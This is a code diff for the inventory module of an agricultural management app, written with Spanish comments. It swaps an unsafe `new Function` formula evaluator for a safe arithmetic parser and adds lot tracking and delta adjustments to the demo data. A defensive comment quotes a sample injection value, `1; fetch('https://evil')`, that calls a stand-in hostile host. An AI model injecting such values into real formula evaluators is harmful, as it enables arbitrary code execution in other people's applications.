@@ -26,7 +26,12 @@ export interface InvLote {
   precio_unitario?:    number;
   cantidad_inicial:    number;
   cantidad_actual:     number;
+  campos_extra?:       InvCampoConValor[]; // valores de los campos personalizados del producto, capturados para ESTE lote
   notas?:              string;
+  /** true si, al desactivarse, su cantidad fue excluida del stock total disponible
+   *  (mediante un movimiento de merma) — se usa para restituirla automáticamente al reactivar,
+   *  SIN tocar la cantidad propia del lote (que se conserva como registro). */
+  stock_descontado?:   boolean;
   activo:              boolean;
   created_at:          string;
 }
@@ -110,6 +115,112 @@ export interface InvFormularioMapa {
   subtipo: InvMovimientoSubtipo;
   formula_cantidad?: string; // expresión opcional; usa nombres de campo como variables
   activo: boolean;
+}
+
+// ─── Evaluador seguro de fórmulas de cantidad ────────────────────────────────
+// Reemplaza el viejo enfoque `new Function("return (" + expr + ")")`, que
+// ejecutaba código arbitrario: si un campo del formulario contenía texto como
+// `1; fetch('https://evil')` o si la fórmula traía algo más que aritmética,
+// se ejecutaba tal cual (riesgo de inyección de código / XSS).
+//
+// Este evaluador es un parser recursivo-descendente que SOLO entiende:
+//   números, identificadores (variables → se sustituyen por su valor numérico),
+//   + - * /, paréntesis y signo unario. Cualquier otro carácter o construcción
+//   (punto y coma, llamadas a función, `=>`, `new`, corchetes, etc.) se rechaza
+//   antes de evaluar — nunca se ejecuta JavaScript proveniente del usuario.
+const FORMULA_TOKEN_RE = /\s*(?:([0-9]+(?:\.[0-9]+)?)|([a-zA-Z_]\w*)|([+\-*/()]))/y;
+
+type FormulaToken = { tipo: "num"; valor: number } | { tipo: "var"; nombre: string } | { tipo: "op"; valor: string };
+
+function tokenizarFormula(formula: string): FormulaToken[] | null {
+  const tokens: FormulaToken[] = [];
+  FORMULA_TOKEN_RE.lastIndex = 0;
+  let pos = 0;
+  while (pos < formula.length) {
+    FORMULA_TOKEN_RE.lastIndex = pos;
+    const m = FORMULA_TOKEN_RE.exec(formula);
+    if (!m || m[0].length === 0) return null; // carácter no reconocido → fórmula inválida/insegura
+    if (m[1] !== undefined)      tokens.push({ tipo: "num", valor: Number(m[1]) });
+    else if (m[2] !== undefined) tokens.push({ tipo: "var", nombre: m[2] });
+    else if (m[3] !== undefined) tokens.push({ tipo: "op",  valor: m[3] });
+    pos = FORMULA_TOKEN_RE.lastIndex;
+  }
+  return tokens;
+}
+
+/**
+ * Evalúa una fórmula aritmética simple (ej. "dosis * area_aplicada") sustituyendo
+ * los identificadores por los valores numéricos presentes en `datos`.
+ * Devuelve `null` si la fórmula contiene algo que no sea aritmética válida —
+ * en ese caso el llamador debe omitir la regla en lugar de arriesgarse a ejecutar
+ * algo no controlado.
+ */
+export function evaluarFormulaCantidad(formula: string, datos: Record<string, unknown>): number | null {
+  const tokens = tokenizarFormula(formula);
+  if (!tokens || tokens.length === 0) return null;
+
+  let i = 0;
+  const peek = () => tokens[i];
+  const consumirOp = (valores: string[]) => {
+    const t = peek();
+    if (t && t.tipo === "op" && valores.includes(t.valor)) { i++; return t.valor; }
+    return null;
+  };
+
+  function parsePrimario(): number | null {
+    const t = peek();
+    if (!t) return null;
+    if (t.tipo === "num") { i++; return t.valor; }
+    if (t.tipo === "var") {
+      i++;
+      const v = datos[t.nombre];
+      const n = typeof v === "number" ? v : parseFloat(String(v ?? ""));
+      return isNaN(n) ? 0 : n;
+    }
+    if (t.tipo === "op" && t.valor === "(") {
+      i++;
+      const valor = parseExpr();
+      if (valor === null) return null;
+      if (consumirOp([")"]) === null) return null; // paréntesis sin cerrar
+      return valor;
+    }
+    return null;
+  }
+
+  function parseUnario(): number | null {
+    const signo = consumirOp(["+", "-"]);
+    const valor = parsePrimario();
+    if (valor === null) return null;
+    return signo === "-" ? -valor : valor;
+  }
+
+  function parseTermino(): number | null {
+    let valor = parseUnario();
+    if (valor === null) return null;
+    let op: string | null;
+    while ((op = consumirOp(["*", "/"])) !== null) {
+      const der = parseUnario();
+      if (der === null) return null;
+      valor = op === "*" ? valor * der : valor / der;
+    }
+    return valor;
+  }
+
+  function parseExpr(): number | null {
+    let valor = parseTermino();
+    if (valor === null) return null;
+    let op: string | null;
+    while ((op = consumirOp(["+", "-"])) !== null) {
+      const der = parseTermino();
+      if (der === null) return null;
+      valor = op === "+" ? valor + der : valor - der;
+    }
+    return valor;
+  }
+
+  const resultado = parseExpr();
+  if (resultado === null || i !== tokens.length) return null; // tokens sobrantes → expresión inválida
+  return resultado;
 }
 
 // ─── Vencimiento helpers ──────────────────────────────────────────────────────
@@ -292,44 +403,54 @@ const DEMO_MOVIMIENTOS: InvMovimiento[] = [
   { id: "MOV-011", catalogo_id: "INV-003", cliente_id: "1", productor_id: "1",
     tipo: "entrada",  subtipo: "compra",           cantidad: 80,  cantidad_anterior: 0,    cantidad_nueva: 80,
     precio_unitario: 45.00, proveedor_id: "AgroquímPro S.A.",
+    lote_id: "LOT-001", lote_numero: "AZX-2024-089",
     fecha: "2026-05-01", usuario_id: "1", created_at: "2026-05-01T08:00:00Z" },
   { id: "MOV-012", catalogo_id: "INV-003", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 8,   cantidad_anterior: 80,   cantidad_nueva: 72,
     registro_origen_tipo: "APLICACION_FITOSANITARIA", observaciones: "Aplicación bloques B1-B3",
+    lote_id: "LOT-001", lote_numero: "AZX-2024-089",
     fecha: "2026-05-05", usuario_id: "4", created_at: "2026-05-05T07:00:00Z" },
   { id: "MOV-013", catalogo_id: "INV-003", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 3.5, cantidad_anterior: 72,   cantidad_nueva: 68.5,
     registro_origen_tipo: "APLICACION_FITOSANITARIA", observaciones: "Aplicación bloque B4",
+    lote_id: "LOT-001", lote_numero: "AZX-2024-089",
     fecha: "2026-05-10", usuario_id: "4", created_at: "2026-05-10T07:30:00Z" },
   { id: "MOV-014", catalogo_id: "INV-003", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 2,   cantidad_anterior: 68.5, cantidad_nueva: 66.5,
     registro_origen_tipo: "APLICACION_FITOSANITARIA", observaciones: "Aplicación preventiva sector C",
+    lote_id: "LOT-001", lote_numero: "AZX-2024-089",
     fecha: "2026-05-17", usuario_id: "4", created_at: "2026-05-17T06:45:00Z" },
   { id: "MOV-015", catalogo_id: "INV-003", cliente_id: "1", productor_id: "1",
     tipo: "ajuste",   subtipo: "conteo_fisico",     cantidad: 66.5, cantidad_anterior: 66.5, cantidad_nueva: 66.5,
     observaciones: "Conteo físico mensual — sin diferencias",
+    lote_id: "LOT-001", lote_numero: "AZX-2024-089",
     fecha: "2026-05-22", usuario_id: "1", created_at: "2026-05-22T16:00:00Z" },
 
   // INV-004 Fertilizante NPK
   { id: "MOV-016", catalogo_id: "INV-004", cliente_id: "1", productor_id: "1",
     tipo: "entrada",  subtipo: "compra",           cantidad: 100, cantidad_anterior: 0,   cantidad_nueva: 100,
     precio_unitario: 1.20, proveedor_id: "NutriAgro Chile",
+    lote_id: "LOT-003", lote_numero: "NPK-2025-003",
     fecha: "2026-05-01", usuario_id: "1", created_at: "2026-05-01T08:30:00Z" },
   { id: "MOV-017", catalogo_id: "INV-004", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 20,  cantidad_anterior: 100, cantidad_nueva: 80,
     registro_origen_tipo: "APLICACION_FITOSANITARIA",
+    lote_id: "LOT-003", lote_numero: "NPK-2025-003",
     fecha: "2026-05-06", usuario_id: "4", created_at: "2026-05-06T08:00:00Z" },
   { id: "MOV-018", catalogo_id: "INV-004", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 15,  cantidad_anterior: 80,  cantidad_nueva: 65,
     registro_origen_tipo: "APLICACION_FITOSANITARIA",
+    lote_id: "LOT-003", lote_numero: "NPK-2025-003",
     fecha: "2026-05-11", usuario_id: "4", created_at: "2026-05-11T07:30:00Z" },
   { id: "MOV-019", catalogo_id: "INV-004", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 10,  cantidad_anterior: 65,  cantidad_nueva: 55,
     registro_origen_tipo: "APLICACION_FITOSANITARIA",
+    lote_id: "LOT-003", lote_numero: "NPK-2025-003",
     fecha: "2026-05-16", usuario_id: "4", created_at: "2026-05-16T07:00:00Z" },
   { id: "MOV-020", catalogo_id: "INV-004", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "aplicacion_campo",  cantidad: 10,  cantidad_anterior: 55,  cantidad_nueva: 45,
     registro_origen_tipo: "APLICACION_FITOSANITARIA",
+    lote_id: "LOT-003", lote_numero: "NPK-2025-003",
     fecha: "2026-05-21", usuario_id: "4", created_at: "2026-05-21T07:15:00Z" },
 
   // INV-005 Sustrato (productor 2)
@@ -358,22 +479,27 @@ const DEMO_MOVIMIENTOS: InvMovimiento[] = [
   { id: "MOV-026", catalogo_id: "INV-006", cliente_id: "1", productor_id: "1",
     tipo: "entrada",  subtipo: "compra",         cantidad: 20, cantidad_anterior: 0,  cantidad_nueva: 20,
     precio_unitario: 89.00, proveedor_id: "BioScience Ltda.",
+    lote_id: "LOT-004", lote_numero: "MS-2024-041",
     fecha: "2026-04-25", usuario_id: "1", created_at: "2026-04-25T09:00:00Z" },
   { id: "MOV-027", catalogo_id: "INV-006", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "uso_produccion", cantidad: 4,  cantidad_anterior: 20, cantidad_nueva: 16,
     observaciones: "Cultivo in vitro batch 1",
+    lote_id: "LOT-004", lote_numero: "MS-2024-041",
     fecha: "2026-05-05", usuario_id: "3", created_at: "2026-05-05T10:00:00Z" },
   { id: "MOV-028", catalogo_id: "INV-006", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "uso_produccion", cantidad: 2,  cantidad_anterior: 16, cantidad_nueva: 14,
     observaciones: "Micropropagación fresas",
+    lote_id: "LOT-004", lote_numero: "MS-2024-041",
     fecha: "2026-05-10", usuario_id: "3", created_at: "2026-05-10T10:30:00Z" },
   { id: "MOV-029", catalogo_id: "INV-006", cliente_id: "1", productor_id: "1",
     tipo: "salida",   subtipo: "uso_produccion", cantidad: 2,  cantidad_anterior: 14, cantidad_nueva: 12,
     observaciones: "Cultivo in vitro batch 2",
+    lote_id: "LOT-004", lote_numero: "MS-2024-041",
     fecha: "2026-05-15", usuario_id: "3", created_at: "2026-05-15T11:00:00Z" },
   { id: "MOV-030", catalogo_id: "INV-006", cliente_id: "1", productor_id: "1",
     tipo: "ajuste",   subtipo: "conteo_fisico", cantidad: 12,  cantidad_anterior: 12, cantidad_nueva: 12,
     observaciones: "Verificación refrigerador — OK",
+    lote_id: "LOT-004", lote_numero: "MS-2024-041",
     fecha: "2026-05-22", usuario_id: "1", created_at: "2026-05-22T16:30:00Z" },
 ];
 
@@ -437,11 +563,16 @@ const DEMO_FORMULARIO_MAPAS: InvFormularioMapa[] = [
     tipo_movimiento: "salida", subtipo: "aplicacion_campo", activo: true,
   },
   {
-    // Regla simple: recepción de bodega → Cajas exportación (producto fijo)
+    // Regla "producto fijo": el formulario MOVIMIENTO_BODEGA no usa TablaInsumos —
+    // siempre mueve el mismo producto del catálogo (Cajas exportación), y la
+    // cantidad real se CALCULA con una fórmula a partir de dos campos numéricos
+    // del formulario: bultos_recibidos * unidades_por_bulto.
+    // Este es el caso de uso real de "campo de cantidad" / "fórmula".
     id: "FM-002", cliente_id: "1",
     tabla_origen: "MOVIMIENTO_BODEGA",
     catalogo_id: "INV-002",
-    campo_jsonb_cantidad: "cantidad",
+    campo_jsonb_cantidad: "bultos_recibidos", // fallback si no hay fórmula
+    formula_cantidad: "bultos_recibidos * unidades_por_bulto",
     tipo_movimiento: "entrada", subtipo: "compra", activo: true,
   },
   {
@@ -513,6 +644,18 @@ interface InventarioContextValue {
    * Nunca hace revert total + re-apply.
    */
   ajustarMovimientosTablaInsumos: (
+    tablaNombre: string,
+    oldDatos:    Record<string, unknown>,
+    newDatos:    Record<string, unknown>,
+    contexto?:   { cultivo_id?: string },
+  ) => void;
+  /**
+   * Edición inteligente para reglas de "producto fijo" (sin TablaInsumos):
+   * calcula el delta entre la cantidad anterior y la nueva (usando la fórmula
+   * si existe) y registra solo la diferencia. Si subiste de 20 a 40 → +20 más.
+   * Si bajaste de 20 a 10 → devolución de 10.
+   */
+  ajustarMovimientosProductoFijo: (
     tablaNombre: string,
     oldDatos:    Record<string, unknown>,
     newDatos:    Record<string, unknown>,
@@ -786,10 +929,9 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
         if (!cid) continue;
         let cant: number;
         if (mapa.formula_cantidad) {
-          const expr = mapa.formula_cantidad.replace(/\b([a-zA-Z_]\w*)\b/g, (m) => {
-            const v = datos[m]; return v !== undefined ? String(v) : m;
-          });
-          try { cant = Number(new Function(`"use strict"; return (${expr})`)()) } catch { continue; }
+          const evaluada = evaluarFormulaCantidad(mapa.formula_cantidad, datos);
+          if (evaluada === null) continue; // fórmula inválida/insegura → se omite la regla
+          cant = evaluada;
         } else {
           cant = parseFloat(String(datos[mapa.campo_jsonb_cantidad] ?? 0));
         }
@@ -832,10 +974,9 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
         if (!cid) continue;
         let cant: number;
         if (mapa.formula_cantidad) {
-          const expr = mapa.formula_cantidad.replace(/\b([a-zA-Z_]\w*)\b/g, (m) => {
-            const v = datos[m]; return v !== undefined ? String(v) : m;
-          });
-          try { cant = Number(new Function(`"use strict"; return (${expr})`)()) } catch { continue; }
+          const evaluada = evaluarFormulaCantidad(mapa.formula_cantidad, datos);
+          if (evaluada === null) continue; // fórmula inválida/insegura → se omite la regla
+          cant = evaluada;
         } else {
           cant = parseFloat(String(datos[mapa.campo_jsonb_cantidad] ?? 0));
         }
@@ -906,14 +1047,9 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
 
       let cant: number;
       if (mapa.formula_cantidad) {
-        const expr = mapa.formula_cantidad.replace(/\b([a-zA-Z_]\w*)\b/g, (match) => {
-          const val = datos[match];
-          return val !== undefined ? String(val) : match;
-        });
-        try {
-          // eslint-disable-next-line no-new-func
-          cant = Number(new Function(`"use strict"; return (${expr})`)());
-        } catch { continue; }
+        const evaluada = evaluarFormulaCantidad(mapa.formula_cantidad, datos);
+        if (evaluada === null) continue; // fórmula inválida/insegura → se omite la regla
+        cant = evaluada;
       } else {
         cant = parseFloat(String(datos[mapa.campo_jsonb_cantidad] ?? 0));
       }
@@ -1002,6 +1138,75 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
     }
   }, [formularioMapas, registrarMovimiento, lotes, catalogos, role, clienteIdStr]);
 
+  // ── Ajuste delta para reglas de producto fijo (sin TablaInsumos) ─────────
+  const ajustarMovimientosProductoFijo = useCallback((
+    tablaNombre: string,
+    oldDatos:    Record<string, unknown>,
+    newDatos:    Record<string, unknown>,
+    contexto?:   { cultivo_id?: string },
+  ) => {
+    const filtroCliente = role === "super_admin" ? null : clienteIdStr;
+    const bloqueRef     = extractBloqueRef(newDatos);
+    const cultivoId     = contexto?.cultivo_id ?? (newDatos.cultivo_id as string | undefined);
+    const invertir      = (t: InvMovimientoTipo): InvMovimientoTipo =>
+      t === "entrada" ? "salida" : t === "salida" ? "entrada" : "ajuste";
+
+    const mapas = formularioMapas.filter(m =>
+      m.activo &&
+      m.tabla_origen === tablaNombre &&
+      m.catalogo_id !== "" &&   // solo reglas de producto fijo
+      (filtroCliente === null || m.cliente_id === filtroCliente),
+    );
+
+    for (const mapa of mapas) {
+      // Calcular cantidad anterior y nueva con la misma lógica que simularTrigger
+      const calcCant = (datos: Record<string, unknown>): number => {
+        if (mapa.formula_cantidad) {
+          const v = evaluarFormulaCantidad(mapa.formula_cantidad, datos);
+          return v ?? 0;
+        }
+        return parseFloat(String(datos[mapa.campo_jsonb_cantidad] ?? 0)) || 0;
+      };
+
+      const oldCant = calcCant(oldDatos);
+      const newCant = calcCant(newDatos);
+      const delta   = newCant - oldCant;
+
+      if (Math.abs(delta) < 0.0001) continue; // sin cambio real
+
+      const cid = mapa.catalogo_id;
+      const loteFefo = lotes
+        .filter(l => l.catalogo_id === cid && l.activo && l.cantidad_actual > 0)
+        .sort((a, b) => a.fecha_vencimiento.localeCompare(b.fecha_vencimiento))[0];
+
+      const unidad = catalogos.find(c => c.id === cid)?.unidad_medida ?? "";
+      const sign   = delta > 0 ? `+${delta}` : String(delta);
+      const obs    = `Corrección por edición (${sign} ${unidad})`;
+
+      if (delta > 0) {
+        // Cantidad aumentó → movimiento adicional en la misma dirección original
+        registrarMovimiento(cid, mapa.tipo_movimiento, mapa.subtipo, delta, {
+          registro_origen_tipo: tablaNombre,
+          observaciones:        obs,
+          lote_id:              loteFefo?.id,
+          lote_numero:          loteFefo?.numero_lote,
+          bloque_ref:           bloqueRef,
+          cultivo_id:           cultivoId,
+        });
+      } else {
+        // Cantidad disminuyó → movimiento inverso (devolución/corrección)
+        registrarMovimiento(cid, invertir(mapa.tipo_movimiento), "devolucion", Math.abs(delta), {
+          registro_origen_tipo: tablaNombre,
+          observaciones:        obs,
+          lote_id:              loteFefo?.id,
+          lote_numero:          loteFefo?.numero_lote,
+          bloque_ref:           bloqueRef,
+          cultivo_id:           cultivoId,
+        });
+      }
+    }
+  }, [formularioMapas, evaluarFormulaCantidad, registrarMovimiento, lotes, catalogos, role, clienteIdStr]);
+
   // ── Transferencia entre áreas ─────────────────────────────────────────────
   const realizarTransferencia = useCallback((
     catalogoId:    string,
@@ -1086,7 +1291,7 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
     agregarLote, editarLote, getLotesByProducto, getLotesFEFO,
     getProductosByModulo, getAllProductos, getMovimientosByProducto,
     getAlertas, getStockCritico, getAlertasVencimiento, simularTrigger,
-    previewReversion, revertirMovimientos, ajustarMovimientosTablaInsumos, realizarTransferencia,
+    previewReversion, revertirMovimientos, ajustarMovimientosTablaInsumos, ajustarMovimientosProductoFijo, realizarTransferencia,
   }), [
     catalogos, movimientos, formularioMapas, lotes,
     proveedores, agregarProveedor,
@@ -1095,7 +1300,7 @@ export function InventarioProvider({ children }: { children: ReactNode }) {
     agregarLote, editarLote, getLotesByProducto, getLotesFEFO,
     getProductosByModulo, getAllProductos, getMovimientosByProducto,
     getAlertas, getStockCritico, getAlertasVencimiento, simularTrigger,
-    previewReversion, revertirMovimientos, ajustarMovimientosTablaInsumos, realizarTransferencia,
+    previewReversion, revertirMovimientos, ajustarMovimientosTablaInsumos, ajustarMovimientosProductoFijo, realizarTransferencia,
   ]);
 
   return <InventarioContext.Provider value={value}>{children}</InventarioContext.Provider>;
